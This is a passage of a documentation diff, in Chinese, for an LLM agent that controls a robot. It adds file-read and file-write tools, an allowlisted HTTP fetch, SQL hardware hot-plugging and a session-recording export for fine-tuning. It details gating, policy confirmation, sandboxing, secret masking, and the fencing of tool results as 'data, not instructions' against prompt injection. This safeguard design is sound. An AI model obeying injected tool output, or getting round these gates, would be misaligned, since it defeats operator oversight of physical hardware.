@@ -27,7 +27,10 @@
 - [摄像头：capture_image](#摄像头capture_image)
 - [提示词包：绑定机器人身份](#提示词包绑定机器人身份)
 - [审计轨迹：--audit-log](#审计轨迹--audit-log)
+- [录制模式与训练集导出：--record](#录制模式与训练集导出--record)
 - [会话持久化：--session-file / --resume](#会话持久化--session-file----resume)
+- [远程对话（已评估，不做）](#远程对话已评估不做)
+- [出站 HTTP：http_fetch](#出站-httphttp_fetch)
 - [策略钩子：--agent-policy](#策略钩子--agent-policy)
 - [工具后端：--mcp-backend（agent 体系的 C++ 半边）](#工具后端--mcp-backendagent-体系的-c++-半边)
 - [安全说明（请务必读）](#安全说明请务必读)
@@ -41,7 +44,7 @@
 | --- | --- | --- |
 | 主流程 | 读一段 `.mt` → 逐行重放 → 退出 | 大模型工具循环，多轮决策后才退出 |
 | 硬件生命周期 | `active()` → `run()` → `deactivate()`，一次性 | 后端 `active()` → **常驻** → 后端停机才 `deactivate()`（Rust 退出不自动断电） |
-| 动作脚本数量 | 一次一段（可用 mtmerge 合成） | 任意多段，逐个由智能体挑选执行 |
+| 动作脚本数量 | 一次一段 | 任意多段，逐个由智能体挑选执行 |
 | 输入源 | `--tcp` / `--input` / stdin | mybot-agent 的 stdin 交互 REPL 或 `--task` 一次性 |
 | 决策者 | 写脚本的人 | 大模型（受提示词与工具边界约束） |
 
@@ -96,6 +99,9 @@ C++ 后端不参与模型请求。
 下文「流式与阻塞的如实偏差」。
 
 REPL 内置命令：`/hardware` 打印硬件清单，`/scripts` 打印动作脚本清单，
+`/sql <语句>` 直接执行结构 SQL——只读语句（`SELECT` / `SHOW TABLES`）路由到
+`query_sql`、含变更语句（`CREATE` / `INSERT` / `DELETE` / `DROP` / `UPDATE`）
+路由到 `apply_sql`（仍受 `--agent-hot-sql` 门控；方言与安全边界见 [dsl.md](dsl.md)），
 `/status` 打印**会话状态一览**（历史大小与任务块数、是否裁过、任务内预算用量、
 本会话模型/工具轮数与失败数、最近一次 token 用量、超时与轮次上限、审计落点与
 session id、硬件变量数；只读，**不触发任何模型调用**——SAN-10，2026-09-22），
@@ -154,6 +160,11 @@ Ctrl-C 照常走下段的取消路径。历史跨会话保留在 `$XDG_STATE_HOM
 `--resume` 则只给 `mybot-agent`。Rust 选项使用 `--选项 值` 写法，详见其 `--help`。
 两端都有 `--audit-log` / `--check-config`，但各管本进程：Rust 记录模型/会话审计，
 配置校验在连接后端之前返回；后端校验行为见表。
+出站 HTTP 的三个选项 `--allow-host` / `--http-fetch-timeout` / `--http-fetch-max-bytes`
+也只给 `mybot-agent`（`http_fetch` 是 Rust 本地工具，不经后端），见
+[出站 HTTP：http_fetch](#出站-httphttp_fetch) 一节。录制的三个选项
+`--record` / `--record-dir` / `--record-max-bytes` 同理只给 `mybot-agent`
+（同样只有命令行入口），见[录制模式](#录制模式与训练集导出--record)一节。
 
 | 参数 | 说明 | 缺省 |
 | --- | --- | --- |
@@ -162,6 +173,8 @@ Ctrl-C 照常走下段的取消路径。历史跨会话保留在 `$XDG_STATE_HOM
 | `--agent-hot-sql` | **显式开启** `apply_sql`（结构 SQL 带电生效：`CREATE TABLE`/`INSERT INTO` 立即装配、上电，失败整批回滚）；须有 policy 且 `require_confirm` 包含 `apply_sql` | **不提供**（见「安全」节第 10 条）；只能由后端命令行授权，配置文件不能自行开启 |
 | `--agent-policy <路径>` | 策略钩子文件（严格 JSON）：命中 `require_confirm` 的工具每次调用先过**外部确认程序**；也可由后端配置的 `agent_policy` 指定 | 未开危险能力时可不启用（见「策略钩子」节） |
 | `--read-var <变量名>` | 声明一个**可读**硬件变量，**可重复**；注册 `read_variables` 与 `wait_variable` 工具（缺省**不提供**这两个工具）。只有已注册且种类为 `lua`（驱动）或 `daemon`（守护快照）的名字生效——执行器与传感器同属 `kind=lua`，靠种类分不出，故必须由人列名（见「工具」表与安全说明第 12 条） | 不提供（即无回读能力；声明了名字但一个都不可读时也不提供） |
+| `--fs-root <目录>` | **list_dir / read_file 的只读根目录**（Phase 4）；注册这两个只读文件工具（与硬件/shell 无关）。路径沙箱见 `agent_sandbox.hpp`（见「工具」表与安全说明第 13 条） | 不提供（即无这两个工具）；**只能命令行给**，配置文件写 `fs_root` 会被拒绝加载 |
+| `--agent-write-file` | **显式开启** `write_file`（Phase 5）：在 `--fs-root` 根之内创建/覆盖文本文件（先写同目录临时文件再原子落地：新建用 `link`、覆盖用 `rename`；符号链接目标拒绝；已存在须显式 `overwrite:true`；落地权限 0600）。**依赖 `--fs-root`**（只给本开关会在上电前报错退出 2）；须有 policy 且 `require_confirm` 包含 `write_file`（见「工具」表与安全说明第 14 条） | 不提供（即无写文件能力）；**只能命令行给**，配置文件写 `allow_write_file` 会被拒绝加载 |
 | `--camera-var <变量名>` | 承载摄像头驱动的变量名 | `cam0` |
 | `--camera-device <路径>` | 摄像头设备（需支持 MJPEG；驱动只放行 `/dev/videoN`） | `/dev/video0` |
 | `--camera-src <图片>` | 模拟图片来源：不接摄像头也能跑通「拍照 → 进上下文」。**命令行**给的 src 以其所在目录为白名单根；配置文件给的 `camera_src` **不**推导根（见安全说明第 9 条），需配 `--camera-src-dir` 或 `BOT4CJ_CAMERA_SRC_DIR` | — |
@@ -227,11 +240,11 @@ BOT4CJ_LLM_CONFIG=/etc/mybot/llm.json ./build/mybot --robot=robots/spider1.sql \
   两端的 `--check-config` 摘要可分别核对实际配置路径，Rust 校验不替代后端能力校验。
 - **显式关闭**：Rust 用 `--llm-config none` 或 `BOT4CJ_LLM_CONFIG=none`；C++ 后端只能用 `BOT4CJ_LLM_CONFIG=none`。环境变量须分别传给对应进程。
   缺省查找依赖各进程的 CWD，同一份命令换台机器可能读到不同配置——CI/守门/复现问题时应显式关掉或显式指定。
-- **字段归属**：Rust 消费模型、提示词、会话、模型重试及上下文预算字段；摄像头、脚本目录、工具超时、能力门控与策略由后端消费。Rust 对后端专属字段只登记为已知字段、不解析或授权；以下能力字段的拒绝规则由后端执行。`audit_log` 两端各自生效。
+- **字段归属**：Rust 消费模型、提示词、会话、模型重试及上下文预算字段；摄像头、脚本目录、工具超时、能力门控与策略由后端消费。两侧对对方的专属字段都只登记为已知字段、不解析或授权（Rust 对后端专属字段如此；2026-10-01 批次 A 后 C++ 后端对模型侧字段同样只经白名单不解析——模型侧的类型/值域校验是 mybot-agent 的独占职责）；以下能力字段的拒绝规则由后端执行。`audit_log` 两端各自生效。
 - **字段**：`driver` `var` `endpoint` `model` `api_key` `api_key_file` `timeout` `max_tokens`
   `temperature` `top_p` `reasoning_effort` `thinking` `stream` `max_turns` `max_task_seconds` `scripts_dir`
-  `allow_shell` `allow_hot_sql` `prompt_files` `camera_var` `camera_device` `camera_src` `allow_camera` `audit_log`
-  `agent_policy` `session_file` `max_history_bytes` `max_task_tool_result_bytes` `max_task_image_bytes`
+  `allow_shell` `allow_hot_sql` `allow_write_file` `prompt_files` `camera_var` `camera_device` `camera_src` `camera_src_dir` `allow_camera` `audit_log`
+  `agent_policy` `read_vars` `fs_root` `session_file` `max_history_bytes` `max_task_tool_result_bytes` `max_task_image_bytes`
   `max_calls_per_round` `max_retries` `retry_backoff_ms` `run_command_timeout_sec`
   `run_command_max_timeout_sec` `action_script_timeout_sec` `history_summary` `max_summary_bytes`。
   配置文件字段均可省略；Rust 必需的 endpoint、model、密钥须由其他入口补齐。
@@ -247,6 +260,10 @@ BOT4CJ_LLM_CONFIG=/etc/mybot/llm.json ./build/mybot --robot=robots/spider1.sql \
   `camera_src_dir` 与 `read_vars` 则**一律拒绝**（写了就退出 2，无论命令行给不给）：
   它们分别决定"能读哪个目录"与"能读哪些硬件变量"，属**放宽读权限**的字段，
   只能由命令行 `--camera-src-dir` / `--read-var` 提供（理由见第 9、12 条）。
+  `fs_root` 同判据（理由见第 13 条）：只能由命令行 `--fs-root` 提供，写进配置文件
+  同样一律拒绝加载并退出 2。`allow_write_file` 同判据（理由见第 14 条）：只能由命令行
+  `--agent-write-file` 授权，未给该命令行开关时配置文件写 `true` 会拒绝加载并退出 2；
+  命令行已授权时配置里的同向 `true` 不报错（授权来自命令行，与 `allow_shell` 同款）。
   三个 `max_*_bytes` 字段是**上下文字节预算**（单位字节，`0` = 不限，上限 64 MiB）：
   `max_history_bytes` 会话历史（缺省 4 MiB）、`max_task_tool_result_bytes` 单任务内
   文本（缺省 2 MiB）、`max_task_image_bytes` 单任务内图片（缺省 4 MiB）。原为编译期
@@ -263,7 +280,7 @@ BOT4CJ_LLM_CONFIG=/etc/mybot/llm.json ./build/mybot --robot=robots/spider1.sql \
   | 字段 | 区间 | 含义与缺省 |
   | --- | --- | --- |
   | `max_calls_per_round` | 1-1024（**拒绝 0**） | 单轮向物理机器人下发动作数的上限，缺省 16。`0` 在下游是「不限」的旧语义，对机器人没有正当用法，配置文件不得放宽（与 `allow_shell` 同源口径）。超限时**只派发前 N 条**，其余折叠成一句说明**追加进该轮 assistant 的文本**（不额外产生 `tool` 消息——`tool_call_id` 必须与 assistant 声明的调用一一对应），同时往日志打一行 `[上限] …已丢弃 K 条未派发`：模型与操作者都必须知道被截断了（SAN-1/SAN-8） |
-  | `max_retries` | 0-6 | 模型调用失败（**网络类与限流**）的**尝试次数（含首次）**，缺省 3。`0` = 只发一次不重试——离线/内网直连想立刻失败时用。可重试的判据由驱动给出的结构化字段决定（`http_status` / `curl_rc` / `retriable`）：429 与 5xx 可重试、其余 4xx 不可（重试不会改变结果，只烧配额），连接类 curl 错误码（6/7/28/35/52/55/56）可重试（SAN-3，2026-09-22） |
+  | `max_retries` | 0-6 | 模型调用失败（**网络类与限流**）的**尝试次数（含首次）**，缺省 3。`0` = 只发一次不重试——离线/内网直连想立刻失败时用。可重试判据在 Rust 侧按 rig 的 `CompletionError` 分类（`agent/src/model.rs` 的 `classify`）：429（限流，退避尊重 `Retry-After`）与 5xx 可重试、其余 4xx 不可（重试不会改变结果，只烧配额）；无 HTTP 状态时，连接/传输类错误与单次调用超时（`ModelTimeout`）可重试（SAN-3，2026-09-22） |
   | `retry_backoff_ms` | 0-10000 | 重试退避基础时长（指数增长），缺省 1000；单次退避另有 60s 上限，防止放宽区间后算出小时级等待。**被限流时（429）改用服务端 `Retry-After`**，与本地指数退避取较大值，日志点名来源；该值钳到 1s-5min（SAN-3） |
   | `run_command_timeout_sec` | 1-600 | `run_command` 的缺省超时，缺省 10 |
   | `run_command_max_timeout_sec` | 1-3600，且 **≥ 上一个** | 模型经 `timeout_seconds` 能请求的上限，缺省 60 |
@@ -296,8 +313,9 @@ BOT4CJ_LLM_CONFIG=/etc/mybot/llm.json ./build/mybot --robot=robots/spider1.sql \
 - **别提交密钥**：仓库 `.gitignore` 已忽略 `mybot.llm.json` / `*.llm.json`；
   模板见仓库根的 `mybot.llm.json.example`。
 - **厂商特有字段**（如 DeepSeek 的 `thinking` / `reasoning_effort`）与 `driver`/`endpoint`/`model`
-  一样，都是 Rust agent 配置里的**已承认字段**（`agent/src/config.rs` 的 `KNOWN_FIELDS`
-  与 C++ `kKnown` 同集合，双端同判据拒绝未知字段）；C++ 后端不消费模型侧字段
+  一样，都是 Rust agent 配置里的**已承认字段**（`agent/src/config/file.rs` 的
+  `PARSED_FIELD_NAMES`（由 `parsed_fields!` 宏表展开）+ `KNOWN_UNPARSED_FIELDS` 两个清单，
+  与 C++ `src/llmconfig.cpp` 的 `kKnown` 同集合，双端同判据拒绝未知字段）；C++ 后端不消费模型侧字段
   （`mergeLlmLayer` 的有意早退）。协议差异全部属于 Rust 侧的 provider 实现。
 
 ## 模型调用（Rust 直连；Lua 协议驱动轨道已删）
@@ -310,7 +328,7 @@ BOT4CJ_LLM_CONFIG=/etc/mybot/llm.json ./build/mybot --robot=robots/spider1.sql \
 > Lua 协议驱动轨道（`modules/Llm*.lua` + `modules/lib/llm_*.lua` + 两个离线用例 +
 > `test_curl_consts`）整条删除——agent 会话自 2026-09-24 批次 B 起就走 Rust 直连，
 > 那条轨道的唯一潜在用途是「结构脚本声明成普通硬件变量供 `.mt`/`@Daemon` 直调」，
-> 而仓库内外零处这么用（完整评估见 changelog 当日条目）。现役含义：C++ 宿主
+> 而仓库内外零处这么用（完整评估见提交 c1e25f1）。现役含义：C++ 宿主
 > **不加载任何 LLM 驱动**，只把协议族名透传给 agent（配置文件的 `driver` 字段
 > 在双端 `--check-config` 镜像里仍可见）；`--llm-driver`/`--llm-var` 属于
 > Rust agent，C++ 后端照旧拒绝（退出 2）。
@@ -346,7 +364,7 @@ mybot-agent（Rust）     模型循环（provider.rs 直连 provider：reqwest +
 | 工具 | 作用 | 关键约束 |
 | --- | --- | --- |
 | `list_action_scripts` | 列出 `--scripts-dir` 下全部 `.mt`（相对路径 + 首行说明）；符号链接条目不列 | 只读 |
-| `run_action_script` | 在**常驻**机器人上执行指定 `.mt`；回执除「已执行」外还带**驱动返回表**（器件读数，如 `{"result":"OK","slept":200}`）——执行窗口内的框架回显被回收进回执，模型因此看得见读数（D，2026-09-23）；上限 8 KiB，超限截断并显式标注 | 只允许 `--scripts-dir` 下的相对路径；拒绝绝对路径、`..`、非 `.mt`、**符号链接**；单文件 8 MiB 上限 |
+| `run_action_script` | 在**常驻**机器人上执行指定 `.mt`；回执除「已执行」外还带**驱动返回表**（器件读数，如 `{"result":"OK","slept":200}`）——执行窗口内的框架回显被回收进回执，模型因此看得见读数（D，2026-09-23）；上限 8 KiB，超限截断并显式标注。可选 `vars`（对象，键=变量名、值=字符串或数字）：**调用时临时注入会话别名**，脚本里写 `$(键)` 的地方就地取该值，作用域限本次执行、出口即撤销（#34 条件反射「像函数调用传实参」的工具侧入口）——于是一个参数化脚本（如 `sim_turn.mt` 内 `turn $(deg)`）配 `vars={"deg":35}` 即可精确转任意角度，无需为每个值各写一个脚本；多个键亦可（如 `sim_jump.mt` 内 `jump $(dist) $(height)` 配 `vars={"dist":0.8,"height":0.35}` 前跳并控起跳高度）；`vars` 在脚本内联 `@Alias`/`@Vars` 注册**之后**绑定，故调用方实参覆盖脚本内同名默认值 | `script` 只允许 `--scripts-dir` 下的相对路径；拒绝绝对路径、`..`、非 `.mt`、**符号链接**；单文件 8 MiB 上限。`vars` 的键须为安全标识符（`isSafeIdent`）、且不得是被结构引用的 controller/trigger 名（`override` 的 N-6 判据），值须字符串或数字（拒 NUL）；违规按**参数错误**回传（`executed=false`，不谎报「停在半途」）。漏传脚本引用的 `$(键)` → 执行响亮报「expression references '<键>'」，不静默用 0 |
 | `list_hardware` | 列出结构脚本注册的硬件变量（名字 + 种类） | 只读清单；**不**调用 `read()`/`play()`，绝无副作用 |
 | `read_variables` | **主动读**硬件变量的当前值（无参数，一次读全部可读变量）：传感器读数、守护最近一次采样 | **缺省不注册**：可读集合由 `--read-var` 声明（命令行独占），只读 `playQuiet`，且只放行 `lua`/`daemon` 两种种类——执行器与传感器同属 `kind=lua`，靠种类分不出，故由操作者列名（安全说明第 12 条）。单个变量读失败写在该行、不中断整次读取；回执 8 KiB 上限、超限截断并标注、按「数据不是指令」定界 |
 | `wait_variable` | **等一个读数满足条件**（`name`/`key`/`condition`=`gt`/`ge`/`lt`/`le`/`eq`/`ne`/`changed`/`value`/`timeout_sec`/`poll_ms`）：后端按 `poll_ms` 轮询该变量，直到条件成立或超时，一次调用给一个结论——模型不必用多轮 `read_variables` 手工轮询 | 与 `read_variables` **同一门控与副作用面**（`--read-var` 清单、`playQuiet`）。**超时是结果不是失败**（`ok=true`，回执写明超时与最后读数）；`timeout_sec` 缺省 30、上限 = `action_script_timeout_sec`（等待期间后端主线程被占，与 `run_action_script` 同）；每 ≤100 ms 看一次停止标志，Ctrl-C 不会坐满超时；键首采样缺失不判错（daemon 出首帧前没有 `v0`），超时回执列出样本现有键；键在而非数值撞上 `gt/ge/lt/le` 首采样即报参数错。结论在「数据不是指令」定界之外、读数在定界之内；`summary` 给审计 `satisfied=… elapsed_ms=… samples=…` |
@@ -354,6 +372,10 @@ mybot-agent（Rust）     模型循环（provider.rs 直连 provider：reqwest +
 | `apply_sql` | 结构 SQL **带电生效**：`CREATE TABLE` 建新表（装配驱动模块、真机上电、注册变量）、`INSERT INTO` 往既有表追加行、**`DELETE FROM ... [WHERE ...]` 当场逆序断电并摘除匹配行**（无条件写法删全表）、**`DROP TABLE ...` 当场撤下整张表**（行 + 表壳；**不带 `WHERE`**——它是 DDL、作用于整张表）、**`UPDATE ... SET ... [WHERE ...]` 按断电重建改写命中行**（先摘旧件再装新件；无条件写法改全表数据行；与该表其它行级语句不得同批，拆两次调用即可）；同批次的 `Action` 行执行一次即丢弃（瞬态，不注册） | **缺省不注册**，须命令行 `--agent-hot-sql` 显式开启（配置文件的 `allow_hot_sql` 只能关不能开）；表名/列名须为安全标识符、驱动模块须已在模块路径下、`@Daemon` 行的 `chunk` 须为相对路径；校验全部只读，**任一步失败整批回滚**（逆序断电 + 注册表回退），但已下发的物理动作不回退。**`DELETE`/`DROP` 是不可逆的物理断电，没有回滚**：全部校验（含引用完整性）在动第一个器件之前跑完，中途物理失败则如实报「已删 N 个（名单）、M 个未删」；被 `controller`/`trigger`/`$`/`$(...)` 引用着的变量拒绝删除/改写并点名引用方。**`UPDATE` 批次是先删后建**：新件装配失败时已摘旧件不复原，错误点名丢失的变量（按需要的值重新 INSERT 即可恢复）。对照/查询请用 `query_sql` |
 | `capture_image` | **拍一张照片并把画面注入上下文**，多模态模型因而能「看见」环境 | 经 `modules/Camera.lua` 取帧（V4L2 + MJPEG）；`--no-camera` 可关闭；图片走独立通道（见下节）。可请求采集尺寸：`width`/`height`（像素 16..8192，须同时给出，缺省 640x480）——换尺寸重开设备、代价高于同尺寸连拍；设备就近调档时回执报**实际**尺寸；仿真来源不缩放、请求尺寸无效并明说 |
 | `run_command` | 在主机上执行 shell 命令（退出码 + stdout + stderr） | 超时（缺省 10s，上限 60s，超时整进程组 SIGKILL）、单流 64KB 截断、环境变量清洗、继承 fd 全部 CLOEXEC、**回执进模型上下文前遮蔽敏感值**（G1）；**缺省不注册**，须命令行 `--agent-shell` 显式开启（配置文件的 `allow_shell` 只能关不能开，写 `true` 会拒绝加载） |
+| `list_dir` | 列出机器人主机上一个目录下的条目（文件名 + 类型 + 大小；只读、不递归；`path` 缺省为只读根目录本身） | 符号链接条目不列；条目数上限 1000（超限截断并标注）；**缺省不注册**，须命令行 `--fs-root <目录>` 显式开启（配置文件的 `fs_root` 一律拒绝加载，见安全说明第 13 条） |
+| `read_file` | 读取机器人主机上一个文本文件的全部内容（只读） | 路径必须落在 `--fs-root` 根目录之下（`agent_sandbox.hpp` 的 `resolveUnderRoot`：词法 + canonical 根包含性，符号链接逃逸一律拒绝）；大小上限 64 KiB（超限响亮拒绝，不截断）；二进制（含 NUL 或非法 UTF-8）拒绝返回；回执经 `maskSecretsInText` 遮蔽敏感值（与 `run_command` 同单点）；**缺省不注册**，须命令行 `--fs-root <目录>` 显式开启（与 `list_dir` 同门控，配置文件不能开） |
+| `write_file` | 在机器人主机上创建或覆盖一个文本文件（原子写入：先写同目录临时文件再落地，不留半截内容） | 路径同 `read_file` 的沙箱判据；目标是符号链接一律拒绝（无论 `overwrite`）；目标已存在时**默认拒绝覆盖**，须显式 `overwrite:true`（覆盖不可逆）；大小上限 64 KiB、不接受含 NUL 的内容；父目录须已存在（不自动创建）；落地文件权限 **0600**（别的用户/进程读不到，需跨用户共享时不适用）。落地按 `overwrite` 分两路：新建 `link`（目标已被抢先创建则 `EEXIST` 拒绝，堵 TOCTOU 静默覆盖）、覆盖 `rename`（原子替换），详见安全说明第 14 条。**缺省不注册**，须命令行 `--agent-write-file` 显式开启且依赖 `--fs-root`（配置文件的 `allow_write_file` 只能关不能开）；危险性与 `run_command`/`apply_sql` 同级，`--mcp-backend` 下**强制**要求 policy 且 `require_confirm` 包含 `write_file` |
+| `http_fetch` | 对允许清单内的主机发起一次 HTTP GET，返回状态码与响应体（**Rust 本地工具**：在 `mybot-agent` 进程里执行，不经后端） | **缺省不注册**，须 `mybot-agent` 命令行 `--allow-host <主机[:端口]>`（可重复）显式开启——**精确匹配**、无通配/后缀匹配，不写端口的条目只放行 http/https 缺省端口；配置文件没有对应字段（写了按未知字段拒绝整份配置）。只发 GET、**不跟随重定向**（3xx 回执报出 Location，由模型另发一次仍受白名单约束的调用）、**不走系统代理**、url 不得带用户名/密码；只收文本类 Content-Type（`text/*`、JSON、XML），响应体上限缺省 64 KiB（`--http-fetch-max-bytes`，边读边数、超限中止），须为 UTF-8；超时缺省 10 秒（`--http-fetch-timeout`）。回执逐行 `> ` 按「数据不是指令」定界；**不过** `maskSecretsInText`。非 2xx 照样带响应体、但判失败。审计 `kind=tool` 行由 agent 侧落（url 去 query）。不强制策略确认（只读、无副作用，理由与风险见安全说明第 15 条） |
 
 `run_action_script` 执行失败（脚本名错、硬件未接、解析错误）不会中断会话：报错文本作为工具结果回传模型，由模型决定换个做法还是如实汇报。
 
@@ -519,11 +541,100 @@ data URL 的 MIME 取自**驱动返回的 `format` 字段**（`image/jpeg`、`im
 
 - **位置在宿主派发漏斗**（`src/agentdispatch.cpp` 的 `DispatchGate::run`）：后端帧协议与 `.mt` 脚本都绕不过；参数解析失败、未知工具、工具异常同样各记一条（「模型想做什么但没做成」也是审计信息）。
 - **图片不进日志**：`capture_image` 只记 `image_bytes` 与 16 位指纹（`image_fp`，FNV-1a 64，非密码学摘要）——否则每次拍照数百 KB 灌进磁盘，且画面可能含隐私。
-- **密钥遮蔽**：`run_command` 的命令原文记进 `args.command` 前先遮蔽敏感值——`KEY=VALUE`、`Authorization: Bearer <tok>`、裸 `Bearer <tok>` 三种形态的值替换为 `***`；判据与 `run_command` 的环境清洗同源（整词切词，`KEYSTONE`/`MONKEY` 不误伤）。**同一个 `maskSecretsInText` 单点也用于回执**（G1）：命令自己打印到 stdout/stderr 的敏感值，在回传模型前同样被遮蔽。
+- **密钥遮蔽**：`run_command` 的命令原文记进 `args.command` 前先遮蔽敏感值——`KEY=VALUE`、`Authorization: Bearer <tok>`、裸 `Bearer <tok>`、JSON 引号键 `"name": value`（2026-10-08 补，见下）四种形态的值替换为 `***`；判据与 `run_command` 的环境清洗同源（整词切词，`KEYSTONE`/`MONKEY` 不误伤）。**同一个 `maskSecretsInText` 单点也用于回执**（G1）：命令自己打印到 stdout/stderr 的敏感值，在回传模型前同样被遮蔽；`list_dir`/`read_file`（第 13 条）的文件内容回执同样经这个单点（2026-10-08 补，此前只有 `run_command` 接了，是审计 P1 发现的缺口）。
+- **谁落工具行**：后端工具的 `kind=tool` 行由后端（`mybot --mcp-backend --audit-log`）在派发漏斗里落；
+  不经后端的 Rust 本地工具 `http_fetch` 后端看不见，其 `kind=tool` 行由 `mybot-agent` 的 `--audit-log`
+  落，字段同名同义（`turn`/`tool`/`args`/`ok`/`error`/`ms`/`bytes`/`summary`；`args.url` 去掉查询串、
+  片段与 userinfo，`summary` 为 `status=<HTTP 状态码>`）。两侧共用同一个审计文件时，同一会话的工具行
+  就按时间交错在一起。（`ica_*` 是纯内存账本、无外部副作用，不落工具行。）
 - **生效摘要（G2）**：`apply_sql` 等工具行的 `summary` 字段记工具自报的结构化生效信息（新增几张表/几个变量/几行……），供复盘对账「这次热插到底改了什么」；只做加法，不带 `summary` 的老工具行不出现该键。
 - **失败响亮**：日志流写入失败（磁盘满等）向 stderr 告警一次，不打断机器人动作；路径打不开则**上电前**报错退出 2（「配置错误不碰真机」）。
 - 默认**关闭**（不传 = 不写任何东西）；开启即 append-only，不做轮转（交给外部工具收集）。会话开始时把实际落点打印到 stderr。
 - 审计是**记录**不是防线：它不审批、不拦截；配合 `--agent-shell` 使用时请把它当「事后追责」证据，而非「事前阻止」闸门。
+
+## 录制模式与训练集导出：--record
+
+> **定位（2026-10-09）**：审计轨迹记「计时与次数」，会话文件记「可恢复的历史文本」
+> （图片刻意不落盘，见上文），录制是**第三条通道**——把每段会话的**完整详细上下文**
+> （含图片本体）留档。主要用途是**微调小模型的训练数据采集**（`scripts/record_export.py`
+> 导出），顺带供事后复盘「模型当时实际看到了什么（含照片）、说了什么」。缺省关闭；
+> 会话文件 v1 行格式与审计语义**都不改**（录制是独立旁路，不是它们的扩展）。
+
+`mybot-agent` 的三个选项**只有命令行入口**（配置文件没有对应字段，写了按未知字段
+拒绝整份配置）：录制把完整上下文与图片写到磁盘，敏感面比会话文件更大，只认操作者
+亲手给的命令行——与 `--allow-host` 同判据。
+
+- `--record`：开启录制，段落落在 `$MYBOT_HOME/robots/<机器人>/recordings/`
+  （`$MYBOT_HOME` 缺省 `$HOME/.mybot`；无状态目录时上电前报错退出 2）。
+- `--record-dir <目录>`：显式录制根（与 `--record` 互斥；不依赖状态目录）。
+- `--record-max-bytes <n>`：图片仓总量上限（0..68719476736，缺省 0 = **不限**——采集
+  跑批的磁盘由人盯着，上限留给「机器人现场顺手开录制」的部署手动设置；超限**响亮
+  降级**为仅元数据，文本事件不受限）。
+
+**布局**（一个录制段 = 一个目录，append-only 不轮转；目录 0700、文件 0600，
+与会话文件同规）：
+
+```text
+<录制根>/latest                     指针（0600）：当前段目录名，续接时链回前段
+<录制根>/<UTC 段名>/                段目录（O_EXCL 占位，同名退 -<pid>）
+    meta.json                       会话元信息（模型/脱敏接入点/工具 schema 快照/
+                                     各指纹/会话文件路径），写一次
+    system.txt                      系统提示词全文（重放需要；会话文件刻意不落它）
+    events.jsonl                    事件流（0600，逐行 flush，追加写）
+    images/<序号>-<指纹>.<ext>       图片本体（base64 解码后的二进制，指纹去重）
+```
+
+**事件流**：每行 `{ts, seq, event, …}`，`event` 决定其余字段。消息按**增量**记录
+（水位之后的新消息才落，`R20` 守门）：`task_begin` → `model_call`（口径同审计
+model 行：turn 0-based、attempts、token 只记 provider 给的数；摘要轮不带 turn）→
+`msg`（本轮新消息，含 tool_calls/回执全文/图片引用）→ `task_end{ok}`。
+`history_evict`/`history_summary`/`clear`/`resume` 维持水位一致性——**任意轮次
+的有效上下文可由事件重放重建**（被裁块换成挂在系统提示词末尾的摘要节），不需要
+每轮整份快照。消息编码保持内容块次序：一条 user 消息可能是
+`[tool_result, text(图片说明), image]`，正是图片注入后的线上形态；图片块只落引用
+`{file, bytes, fp, mime}`，**base64 永不进 JSONL**。工具调用不单独记事件——参数在
+assistant 消息的 tool_calls 里、回执全文在 tool_result 里，消息流本身就是训练数据
+要的形态；计时与 exit_code 由审计轨迹承担（分工）。
+
+**续接关联**：会话续接（默认续接/`--resume`）时**新开一个录制段**（不向旧段追加，
+append-only 不可变），`meta.json` 的 `resumed_from` 链回前段；恢复进来的历史前缀
+**不重复落事件**（由会话文件承载，meta 记了路径，导出器做联结）。
+
+**失败语义**（对齐会话文件）：段建不起来 → 启动期退出 2（配置错误不碰真机）；
+中途写失败 → stderr 告警一次并停用录制，对话照常（不静默丢，也不打断机器人）。
+
+**密钥纪律**：`meta.json` 只记 `api_key_source` 枚举与脱敏接入点（复用审计的
+`sanitize_endpoint`），**密钥值绝不出现**；工具回执按「进入上下文的原样」记录
+（后端工具已过 `maskSecretsInText`，`http_fetch` 本就不遮蔽——见已知限制）。
+
+**训练集导出**：`scripts/record_export.py`（纯标准库 Python，与 mcp_e2e 的帧客户端
+同规）：
+
+```bash
+# 先只读检视：时间线 + 每个任务的成败/轮数/图片数
+python3 scripts/record_export.py --inspect <段目录或录制根>
+
+# 缺省：任务块粒度、effective 上下文（模型当时实际看到的，含摘要节）、openai 方言
+python3 scripts/record_export.py --out /tmp/ds <段目录>
+
+# sharegpt 方言（Qwen <tool_call>/<tool_response> 约定 + LLaVA <image> 标记与图片复制）
+python3 scripts/record_export.py --to sharegpt --keep-reasoning --out /tmp/ds <段目录>
+
+# 整段轨迹：多个段按 resumed_from 链拼接成一条（system_fp 不同的段拒绝串）
+python3 scripts/record_export.py --granularity session --to raw <录制根>
+```
+
+样本形如 `{task_meta:{ok,turns,prompt_tokens,…}, tools:[当时的 schema 快照],
+messages:[system(+摘要节), 上下文前缀, 本任务全部新消息]}`；`--context full` 用
+未裁剪的完整对话（会话文件联结）；`--filter ok|all`（缺省只导成功任务）、
+`--split 0.95`（切 train/val）、`stats.json` 恒产（样本/轮数/token/图片去重率/按
+工具的调用频次）。`openai` 方言把 user 消息的 tool_result parts 先出 tool 角色消息、
+其余 parts 出 user 消息（与线上 provider 转换同序），图片内联 data URL（自包含）。
+
+`/status` 有「录制」一行（落点与事件/图片计数）；`--check-config` 摘要有录制栏
+（缺省布局只报根与模式，不臆造段名）。回归：`scripts/agent_e2e.sh` 的 R20/R20b/
+R20c/R20d（段布局与权限、事件时序、图片本体与源图逐字节一致、三种方言导出回路、
+续接链、超限降级、互斥负路径）+ `record.rs` 单测（水位/去重/降级/权限）。
 
 ## 会话持久化：--session-file / --resume
 
@@ -568,6 +679,28 @@ data URL 的 MIME 取自**驱动返回的 `format` 字段**（`image/jpeg`、`im
      首行不是合法会话头（或版本不认）则整份拒绝——没有头就无从核对指纹。
   2. **指纹核对**：结构脚本名 / 工具集指纹 / 系统提示词指纹三者一致。
      提示词包或脚本清单变了，旧上下文对不上号。
+
+     **工具集指纹的取舍（2026-10-08 补留档）**：它是
+     `fingerprint64(工具名按注册序逗号拼接)`（`agent/src/session.rs:66`），只哈希**名字**。
+     三个推论，操作时都用得上：
+
+     ① **加工具、删工具、改名、调整注册顺序，任一都会让此前所有会话文件的 `--resume`
+     失败**（报「工具集不同（会话头的工具集指纹 X，当前 Y）；工具调用历史对当前会话
+     不再适用」，退出 2）。工具扩展计划曾把这列为开工前必须决定的议题——「接受换新段」
+     还是「设计只增不减的向后兼容指纹」——实际按**接受换新段**落地（`list_dir`/
+     `read_file` 加进来断过一次，`write_file` 又断过一次；开/关 `http_fetch`（给不给 `--allow-host`）同理），但当时没写进任何被跟踪的
